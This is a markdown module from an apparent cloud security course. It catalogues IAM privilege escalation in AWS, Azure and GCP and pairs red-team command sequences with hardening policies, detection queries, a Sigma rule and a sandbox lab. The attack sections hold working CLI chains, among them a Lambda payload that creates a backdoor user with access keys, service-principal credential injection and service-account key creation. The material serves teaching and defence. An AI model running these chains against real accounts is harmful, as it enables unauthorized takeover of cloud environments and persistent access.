# 05 — Privilege Escalation Catalogue

> **Level:** Advanced
> **Prereqs:** [IAM](../IAM); [Initial Access Vectors](initial-access-vectors.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Privilege Escalation (T1548, T1078, T1484), Credential Access
**Authorization scope:** Run only against your own sandbox accounts / sanctioned engagement with written authorization. All ARNs, roles, and principals below are placeholders.

## What & why
Cloud privilege escalation doesn't require a kernel exploit. A misgranted IAM permission *is* the exploit. The attack surface is the IAM policy itself — `iam:PassRole`, `sts:AssumeRole`, and resource-specific "update" APIs that let you attach a more-privileged identity to a resource you control.

## The OnPrem reality
On-prem privesc relies on OS-level misconfigurations: writable `sudoers`, SUID binaries, unquoted service paths, and AD ACL abuse (AdminSDHolder, GPO editing). The attacker needs code execution first. In cloud, you don't need a shell — you just need the right API permission.

## Core concepts

### Privesc technique classes

| Class | Description | Signature |
|---|---|---|
| **PassRole abuse** | `iam:PassRole` lets you attach a privileged role to a resource you create (Lambda, EC2, Glue) | `CreateFunction` + `PassRole` to admin role |
| **AssumeRole chaining** | A role trusting "everyone" or a lower-priv role lets you escalate | `AssumeRole` with no conditions |
| **Resource-policy attachment** | `iam:AttachUserPolicy` / `AttachRolePolicy` allows self-admin | `AttachRolePolicy` with `AdministratorAccess` |
| **Update-resource-to-inject** | Updating a compute resource's attached identity | `UpdateFunctionConfiguration` with new role ARN |
| **Credential-creation self-grant** | `iam:CreateAccessKey` on a higher-privilege user | `CreateAccessKey` for admin user |
| **Permission boundary bypass** | If you can delete your own permission boundary, you can escalate | `DeleteUserPermissionsBoundary` |
| **Token creation / impersonation** | `iam:CreateServiceSpecificCredential` or `serviceAccountTokenCreator` | Token created for a higher-priv SA |
| **Delegation chain abuse** | Exploiting trust between accounts/tenants | Cross-account `AssumeRole` without `ExternalId` |
| **Role-template escalation (Azure)** | `Application Administrator` → add credentials to an app with higher role | Password credential write on privileged SP |

## Cross-cloud privesc matrix

| Technique | AWS | Azure | GCP |
|---|---|---|---|
| PassRole abuse | `iam:PassRole` + `lambda:CreateFunction` with admin role | N/A (MI assignment is separate from resource creation) | N/A (SA binding is separate) |
| Update resource role/identity | `lambda:UpdateFunctionConfiguration` change role ARN | `az vm identity assign --role Contributor` | `gcloud compute instances set-service-account` |
| AssumeRole / Impersonation | `sts:AssumeRole` with trust `Principal: "*"` | Azure AD Privileged Identity Management bypass | `iam.serviceAccounts.actAs` or `getAccessToken` |
| Policy attachment | `iam:AttachRolePolicy` on your own role | `az role assignment create --assignee self --role Owner` | `projects.setIamPolicy` on project |
| Credential creation on higher-principal | `iam:CreateAccessKey` on admin user | `az ad app credential reset` on privileged SP | `iam.serviceAccounts.createKey` on privileged SA |
| Permission boundary removal | `iam:DeleteUserPermissionsBoundary` then `iam:AttachUserPolicy` | N/A | N/A |
| Group membership modification | `iam:AddUserToGroup` with admin group | `az ad group member add` to Global Admin group | `projects.setIamPolicy` adding member |
| Resource injection (start with priv) | `ec2:RunInstances` with instance profile Arn | `az vm create --assign-identity` | `gcloud compute instances create --service-account` |

## AWS

### Canonical PassRole → Lambda escalation

```bash
# Scenario: Attacker has a role 'dev-role' with these perms:
# - iam:PassRole (on arn:aws:iam::111111111111:role/lambda-admin-role)
# - lambda:CreateFunction
# - lambda:InvokeFunction

# Step 1: Verify you can pass the admin role
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::111111111111:role/dev-role \
  --action-names iam:PassRole \
  --resource-arns arn:aws:iam::111111111111:role/lambda-admin-role

# Step 2: Create a Lambda function, passing the admin role
# The Lambda execution role has AdministratorAccess — you now have code execution as that role
aws lambda create-function \
  --function-name privesc-demo \
  --runtime python3.9 \
  --role arn:aws:iam::111111111111:role/lambda-admin-role \
  --handler index.handler \
  --zip-file fileb://function.zip

# function.zip contains code.py:
# import boto3
# def handler(event, context):
#     iam = boto3.client('iam')
#     iam.create_user(UserName='backdoor-user')
#     iam.create_access_key(UserName='backdoor-user')
#     return "escalated"

# Step 3: Invoke the function — code runs as lambda-admin-role
aws lambda invoke --function-name privesc-demo output.txt
cat output.txt
# "escalated"

# Step 4: Verify the backdoor
aws iam list-access-keys --user-name backdoor-user
```

**CloudTrail signature:** `lambda:CreateFunction` with `iam:PassRole` on an admin role, then `lambda:InvokeFunction`, then `iam:CreateUser` + `iam:CreateAccessKey` — all from the same source principal.

### AssumeRole without conditions

```bash
# Trust policy that allows escalation:
# {
#   "Effect": "Allow",
#   "Principal": {"AWS": "arn:aws:iam::111111111111:role/dev-role"},
#   "Action": "sts:AssumeRole",
#   "Condition": {}   // ← EMPTY! No ExternalId, no MFA requirement
# }

# If dev-role can assume admin-role with this trust:
aws sts assume-role \
  --role-arn arn:aws:iam::111111111111:role/admin-role \
  --role-session-name escalation-test

# Now you have admin-role credentials
```

### UpdateFunctionConfiguration escalation

```bash
# If you have lambda:UpdateFunctionConfiguration + iam:PassRole on an admin role,
# swap the function's execution role to admin:
aws lambda update-function-configuration \
  --function-name existing-legit-function \
  --role arn:aws:iam::111111111111:role/AdministratorRole

# Then trigger the function — it now runs as AdministratorRole
```

### Glue DevEndpoint escalation

```bash
# glue:UpdateDevEndpoint + iam:PassRole on higher-priv role
aws glue update-dev-endpoint \
  --endpoint-name existing-endpoint \
  --role-arn arn:aws:iam::111111111111:role/AdminRole
```

### CreateAccessKey on higher-priv user

```bash
# If you have iam:CreateAccessKey, enumerate users first:
aws iam list-users --query 'Users[].UserName'

# Check policies to find an admin:
aws iam list-attached-user-policies --user-name prod-admin
# Output: AdministratorAccess

# Create a key for that admin:
aws iam create-access-key --user-name prod-admin
# Returns AKIA... — a long-lived access key for the admin user
```

## Azure

### Application Administrator → Global Admin via credential injection

```bash
# Scenario: Attacker has Application Administrator role in Azure AD.
# Permissions: can manage app registrations and their credentials.

# Step 1: List privileged role assignments to find target SPs
az rest --method GET \
  --uri 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments'

# Step 2: Find apps assigned to privileged roles
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq '00000000-0000-0000-0000-000000000000'"

# Step 3: Add a password credential to a privileged SP
az ad app credential reset \
  --id 00000000-0000-0000-0000-000000000000 \
  --append \
  --display-name pentest-key

# Step 4: Authenticate as the privileged SP
az login --service-principal \
  --username 00000000-0000-0000-0000-000000000000 \
  --password "$NEW_SECRET" \
  --tenant example-tenant.onmicrosoft.com \
  --allow-no-subscriptions

# Step 5: You now have the roles assigned to that SP
az role assignment list --assignee 00000000-0000-0000-0000-000000000000 --all
```

**Audit log signature:** `Add password credential` or `Update application` in Azure AD audit logs, followed by service principal sign-in from a new IP.

### RBAC role assignment self-escalation

```bash
# If you have Microsoft.Authorization/roleAssignments/write at subscription scope:
az role assignment create \
  --assignee $(az ad signed-in-user show --query id -o tsv) \
  --role Owner \
  --scope /subscriptions/00000000-0000-0000-0000-000000000000
```

### Managed identity abuse

```bash
# If you can update an Azure VM's identity:
az vm identity assign \
  --resource-group example-rg \
  --name example-vm \
  --role Contributor \
  --scope /subscriptions/00000000-0000-0000-0000-000000000000

# Then access IMDS from inside the VM to get a token with Contributor
```

## GCP

### `serviceAccountTokenCreator` impersonation

```bash
# Scenario: Attacker SA has iam.serviceAccountTokenCreator on a privileged SA

# Step 1: Verify the permission
gcloud iam service-accounts get-iam-policy \
  privileged-sa@example-project.iam.gserviceaccount.com \
  --format=json | jq '.bindings[] | select(.role=="roles/iam.serviceAccountTokenCreator")'

# Step 2: Impersonate — get an OAuth2 token for the privileged SA
gcloud auth print-access-token \
  --impersonate-service-account=privileged-sa@example-project.iam.gserviceaccount.com

# OR use the REST API directly:
curl -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/privileged-sa@example-project.iam.gserviceaccount.com:generateAccessToken" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'

# Step 3: Use the privileged token
gcloud config set auth/access_token_file <(echo "$PRIVILEGED_TOKEN")
gcloud projects list  # Now running as privileged-sa
```

### `setIamPolicy` escalation

```bash
# If you have resourcemanager.projects.setIamPolicy on the project:
gcloud projects add-iam-policy-binding example-project \
  --member=serviceAccount:attacker-sa@example-project.iam.gserviceaccount.com \
  --role=roles/owner
```

### `serviceAccountKeys.create` escalation

```bash
# If you can create keys for a higher-priv SA:
gcloud iam service-accounts keys create priv-key.json \
  --iam-account=privileged-sa@example-project.iam.gserviceaccount.com

# Now use the key
gcloud auth activate-service-account \
  privileged-sa@example-project.iam.gserviceaccount.com \
  --key-file=priv-key.json
```

### Compute instance SA swap

```bash
# If you can update an instance's SA:
gcloud compute instances set-service-account existing-instance \
  --service-account=privileged-sa@example-project.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --zone=us-central1-a
```

## OnPrem mapping (recap table)

| Technique | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Credential theft → higher identity | Pass-the-hash to DA | `CreateAccessKey` on admin | `az ad app credential reset` on privileged SP | `serviceAccountKeys.create` on privileged SA |
| Resource identity swap | Scheduled task as SYSTEM | `UpdateFunctionConfiguration` role swap | `az vm identity assign` | `set-service-account` on compute |
| Trust chain abuse | Domain trust (SID history) | `AssumeRole` without ExternalId | Cross-tenant guest + RBAC assignment | SA impersonation chain |
| Group membership abuse | `net group "Domain Admins" /add` | `AddUserToGroup` to admin group | `az ad group member add` to privileged AAD group | `setIamPolicy` adding member |
| Self-grant permissions | SeRestorePrivilege abuse | `AttachRolePolicy` to self | `az role assignment create --assignee self` | `setIamPolicy` on self |

## 🔴 Red Team view

### Mapping every privesc step to a CloudTrail event

When testing privesc in your sandbox, map each action to its CloudTrail `eventName` so you know exactly what defenders see:

| Action | CloudTrail eventName | Log Source |
|---|---|---|
| `lambda:CreateFunction` + `iam:PassRole` | `CreateFunction20150331` | CloudTrail management |
| `iam:CreateAccessKey` | `CreateAccessKey` | CloudTrail management |
| `sts:AssumeRole` | `AssumeRole` | CloudTrail management |
| `lambda:UpdateFunctionConfiguration` | `UpdateFunctionConfiguration20150331v2` | CloudTrail management |
| `iam:AttachRolePolicy` | `AttachRolePolicy` | CloudTrail management |
| `glue:UpdateDevEndpoint` | `UpdateDevEndpoint` | CloudTrail management |
| `iam:AddUserToGroup` | `AddUserToGroup` | CloudTrail management |
| Azure: `Add password credential` | `Update application` (category: ApplicationManagement) | Azure AD audit log |
| Azure: `az role assignment create` | `Create role assignment` (Microsoft.Authorization) | Azure Activity log |
| GCP: `generateAccessToken` | `GenerateAccessToken` | Cloud Audit Log (data access) |
| GCP: `setIamPolicy` | `SetIamPolicy` | Cloud Audit Log (admin activity) |

### Observed behavior pattern

When you set `iam:PassRole` to an admin role and create a Lambda, CloudTrail records:

1. `CreateFunction20150331` — source: `dev-role`, request includes `role: arn:aws:iam::111111111111:role/lambda-admin-role`
2. The `PassRole` is implicit in the `CreateFunction` call — no separate `PassRole` event is emitted.
3. `InvokeFunction` — the Lambda's execution is logged as a separate data event.
4. `CreateUser` + `CreateAccessKey` — source: `lambda-admin-role` (assumed by Lambda service).

The chain is visible but requires correlating 3+ events across different principals.

## 🔵 Blue Team view

### Hardening per technique family

**PassRole abuse:**
```json
// SCP: Restrict PassRole to specific role pairs only
{
  "Effect": "Deny",
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::111111111111:role/lambda-admin-role",
  "Condition": {
    "StringNotEquals": {
      "iam:PassedToService": "lambda.amazonaws.com"
    }
  }
}
```

**Lambda function creation outside CI:**
```json
// SCP: Only CI role can create Lambda functions
{
  "Effect": "Deny",
  "Action": "lambda:CreateFunction",
  "Resource": "*",
  "Condition": {
    "ArnNotLike": {
      "aws:PrincipalArn": "arn:aws:iam::111111111111:role/ci-deploy-role"
    }
  }
}
```

**CreateAccessKey on human users:**
```json
// SCP: Deny access key creation for IAM users entirely
{
  "Effect": "Deny",
  "Action": [
    "iam:CreateAccessKey",
    "iam:UpdateAccessKey"
  ],
  "Resource": "arn:aws:iam::*:user/*"
}
```

**Azure: Monitor SP credential writes:**
```kusto
// Azure AD audit log query
AuditLogs
| where Category == "ApplicationManagement"
| where ActivityDisplayName in ("Add service principal credentials", "Update application")
| where InitiatedBy.app != null
| project TimeGenerated, InitiatedBy.app.displayName, TargetResources[0].displayName
```

**GCP: Alert on SA impersonation:**
```bash
# Log-based alert
gcloud alpha monitoring policies create \
  --notification-channels=projects/example-project/notificationChannels/000000000 \
  --condition-display-name="SA Token Creation" \
  --condition-filter='protoPayload.methodName="GenerateAccessToken" AND protoPayload.authenticationInfo.principalEmail!~"built-in"'
```

### Detection queries

**Detect PassRole + CreateFunction in same session:**
```sql
WITH events AS (
  SELECT useridentity.sessioncontext.sessionissuer.arn AS principal,
         eventname, eventtime
  FROM cloudtrail_logs
  WHERE eventname IN ('CreateFunction20150331', 'CreateAccessKey', 'AssumeRole')
    AND eventtime > now() - interval '1' day
)
SELECT principal, COUNT(DISTINCT eventname) AS unique_actions
FROM events
GROUP BY principal
HAVING COUNT(DISTINCT eventname) >= 2;
```

**Detect AssumeRole without MFA/ExternalId:**
```sql
SELECT eventname, useridentity.arn, requestparameters.rolearn
FROM cloudtrail_logs
WHERE eventname = 'AssumeRole'
  AND requestparameters.rolearn LIKE '%:role/Admin%'
  AND additionaleventdata IS NULL  -- no MFA present
  AND eventtime > now() - interval '1' day;
```

## Hands-on lab

**Objective:** Execute a contained PassRole → Lambda escalation in your sandbox and capture all CloudTrail events.

1. **Create a deliberately vulnerable role:**
   ```bash
   # Role with PassRole to Admin role + CreateFunction
   aws iam create-role --role-name privesc-test-role \
     --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::111111111111:root"},"Action":"sts:AssumeRole"}]}'

   aws iam put-role-policy --role-name privesc-test-role \
     --policy-name vulnerable-policy \
     --policy-document '{
       "Version":"2012-10-17",
       "Statement":[
         {"Effect":"Allow","Action":"iam:PassRole","Resource":"arn:aws:iam::111111111111:role/lambda-admin-role"},
         {"Effect":"Allow","Action":"lambda:CreateFunction","Resource":"*"},
         {"Effect":"Allow","Action":"lambda:InvokeFunction","Resource":"*"}
       ]}'
   ```

2. **Create an admin-like role for the Lambda to assume:**
   ```bash
   aws iam create-role --role-name lambda-admin-role \
     --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
   aws iam attach-role-policy --role-name lambda-admin-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
   ```

3. **Assume privesc-test-role and escalate:**
   ```bash
   # Assume the vulnerable role
   CREDS=$(aws sts assume-role --role-arn arn:aws:iam::111111111111:role/privesc-test-role \
     --role-session-name lab --query Credentials --output json)
   export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
   export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
   export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)

   # Create a payload that creates a new IAM user (contained)
   mkdir -p /tmp/lambda-payload
   cat > /tmp/lambda-payload/index.py << 'EOF'
   import boto3
   def handler(event, context):
       iam = boto3.client('iam')
       try:
           iam.create_user(UserName='privesc-lab-backdoor')
           iam.create_access_key(UserName='privesc-lab-backdoor')
           return "privesc succeeded"
       except Exception as e:
           return str(e)
   EOF
   cd /tmp/lambda-payload && zip -r /tmp/function.zip index.py

   aws lambda create-function \
     --function-name privesc-lab-func \
     --runtime python3.9 \
     --role arn:aws:iam::111111111111:role/lambda-admin-role \
     --handler index.handler \
     --zip-file fileb:///tmp/function.zip

   aws lambda invoke --function-name privesc-lab-func /tmp/output.txt
   cat /tmp/output.txt
   ```

4. **Capture all CloudTrail events from this chain:**
   ```bash
   sleep 120  # wait for CloudTrail delivery
   aws cloudtrail lookup-events --lookup-attributes \
     AttributeKey=EventName,AttributeValue=CreateFunction20150331 \
     --max-results 5
   ```

**Expected output:** A new IAM user `privesc-lab-backdoor` created by the Lambda running as `lambda-admin-role`.

**Teardown:**
```bash
aws iam delete-access-key --user-name privesc-lab-backdoor --access-key-id $(aws iam list-access-keys --user-name privesc-lab-backdoor --query 'AccessKeyMetadata[0].AccessKeyId' --output text)
aws iam delete-user --user-name privesc-lab-backdoor
aws lambda delete-function --function-name privesc-lab-func
aws iam detach-role-policy --role-name lambda-admin-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-role-policy --role-name privesc-test-role --policy-name vulnerable-policy
aws iam delete-role --role-name lambda-admin-role
aws iam delete-role --role-name privesc-test-role
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

## Detection rules & checklists

### Sigma rule: Lambda creation with privileged role

```yaml
title: Lambda Created With Administrator Role
status: experimental
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: CreateFunction20150331
    requestParameters.role:
      - '*/AdministratorRole'
      - '*/Admin*'
  filter:
    userIdentity.invokedBy: 'cloudformation.amazonaws.com'
  condition: selection and not filter
level: high
```

### Cloud Custodian: Alert on Lambda with privileged roles

```yaml
policies:
  - name: lambda-privileged-roles
    resource: aws.lambda
    filters:
      - type: value
        key: Role
        op: regex
        value: ".*(Admin|FullAccess|PowerUser).*"
    actions:
      - type: notify
        template: privileged-lambda
```

### Checklist

- [ ] SCP restricts `iam:PassRole` to known service+role pairs
- [ ] SCP denies `iam:CreateAccessKey` for IAM users
- [ ] SCP denies `lambda:CreateFunction` outside CI/CD roles
- [ ] Alert on `AttachRolePolicy` + `AdministratorAccess`
- [ ] Alert on `CreateAccessKey` for any `user/*` ARN
- [ ] Azure: Alert on `Add service principal credentials` by non-admin
- [ ] GCP: Alert on `GenerateAccessToken` with high-priv SA as target
- [ ] GCP: Org policy disables `iam.disableServiceAccountKeyCreation`

## References

- [AWS IAM PassRole](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html)
- [AWS PrivEsc techniques (RhinoSecurity)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [Azure AD Privilege Escalation](https://posts.specterops.io/azure-privilege-escalation-via-service-principal-4d6d1bb6a92e)
- [GCP Privilege Escalation](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [MITRE ATT&CK Cloud - Privilege Escalation](https://attack.mitre.org/matrices/enterprise/cloud/)
- See also: [09-06-lateral-movement-and-pivoting.md](./lateral-movement-and-pivoting.md)
